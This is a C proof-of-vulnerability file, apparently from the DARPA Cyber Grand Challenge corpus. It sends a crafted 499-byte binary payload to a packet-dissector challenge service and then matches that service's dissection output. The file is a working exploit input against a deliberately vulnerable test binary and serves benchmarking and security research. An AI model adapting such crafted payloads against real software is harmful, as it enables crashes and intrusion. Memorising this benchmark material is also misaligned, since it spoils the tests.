#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xf3\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xdb\x01\x00\x00\xd3\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xd3\x01\x00\x00"
         "\x20\xa4\xe6\x85\x93\xfc\xbf\xeb\x24\x45\x44\xbe\xa5\x53\xa4\x73"
         "\x2e\xa2\xc6\xc4\x3c\x00\x00\x00\xde\x96\x1d\x13\xf7\x2b\x18\x7c"
         "\x01\x00\xda\x41\x00\xef\xeb\xec\x94\x74\xba\xac\x4b\x41\x00\x1f"
         "\x8a\x3c\x98\xdc\x4e\x81\x9d\xaf\x7e\xf4\x39\x01\x00\x3e\xff\xff"
         "\x28\xce\x4b\xcd\x41\x00\x01\x00\x32\xbc\x1e\x15\xbb\xa2\x8a\x74"
         "\x70\x2d\xa5\xc7\xe3\x50\x71\x11\xe7\xc4\xc8\xde\x92\x33\x59\x15"
         "\xd3\x46\x01\x01\xc2\xd4\x4d\x41\x00\x3b\x4b\x89\x24\xa8\x5a\x10"
         "\xe9\x01\x00\x5b\x30\xda\xb4\x3c\x41\x00\x01\x8c\x81\x40\xf7\x7d"
         "\x86\x30\x6e\x01\x9f\x75\x9a\x46\xb3\x46\x19\xeb\x2b\x71\xe5\x6e"
         "\x78\xaf\x60\x7f\x01\x35\x01\x00\x46\x01\x00\x98\x60\x87\x02\x6d"
         "\x43\x1f\xc7\x7e\x33\xc3\x41\xac\xa1\xd1\xf6\xa4\x01\x00\xa5\x01"
         "\x75\xb8\x01\x00\x24\x01\x28\x01\x00\x83\xff\xa7\xf2\xf7\x63\x5c"
         "\x49\x64\xb7\x05\x16\x87\x11\x59\x41\xff\xc8\x26\x2e\x66\x3b\xf1"
         "\xc5\x6e\xe8\xbb\x0e\xf8\xb9\x3b\x0b\x44\x90\x18\xb6\x98\xbb\x9f"
         "\x3e\xee\x37\x9c\xab\x11\x72\x3a\x64\xb2\x37\xcf\x00\xac\x21\x04"
         "\xaa\xa5\xe7\x2d\xb7\xe3\x95\x1b\xd2\x4c\x7f\xbe\x5b\xda\x14\x02"
         "\xf3\xc3\xeb\x20\x60\x04\x48\x62\x7e\x8c\x27\xfa\xfb\x7a\x3e\xd5"
         "\x79\xb2\xc9\xa1\xc6\x49\xfc\xa5\xc5\x72\x88\x3e\xbc\x91\xb4\xbf"
         "\xa6\xab\x04\x86\x54\x48\xb5\x58\xf3\xb7\x83\x14\x4b\x42\xe4\xa6"
         "\xba\x85\xec\xea\x4f\x44\x74\x2b\x55\xbe\xa8\xa9\xe8\x0b\x21\xe7"
         "\xd0\xee\xb5\x4e\x62\x1c\xd1\xf6\x7d\xf7\xe5\x2b\x70\x48\x7f\x8d"
         "\x40\x31\x5c\xd1\x7c\xbe\x89\x5a\x84\xed\x8b\x6d\xa5\xef\xe0\x1d"
         "\x92\x96\xaa\x7e\xba\x91\x9a\x54\x05\x52\x8a\x8f\x3d\x18\x17\xb0"
         "\x33\x67\x5b\x29\x36\x1c\xdc\xbc\xba\x1f\x07\x2d\x93\x23\xc8\x65"
         "\xc4\x28\x86\xe8\x4b\x38\x4d\x4f\x28\x75\x0c\xbe\xec\xb5\xea\x75"
         "\xb7\xe2\x1d\x82\x98\x51\x4f\x03\x4b\xc2\xe1\x2b\xa6\x96\xfd\x69"
         "\xb0\x7d\xeb\x30\xf2\x7f\xda\x01\x5c\x34\xd7\x1a\x9e\x2d\x4e\xb6"
         "\xb9\xe4\xba\x67\x02\x9f\x37\xc9\x8c\xfe\xff\x41\x00\xc9\x7b\xd5"
         "\x43\x2f\x6f\xdf\x14\xa9\x4a\x6d\xc1\xff\x16\x01\xb0\x41\x00\x37"
         "\x6f\x9d\x85";
      static unsigned int write_00001_00000_len = 499;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamafootpad
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x66\x6f\x6f\x74\x70\x61"
         "\x64";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
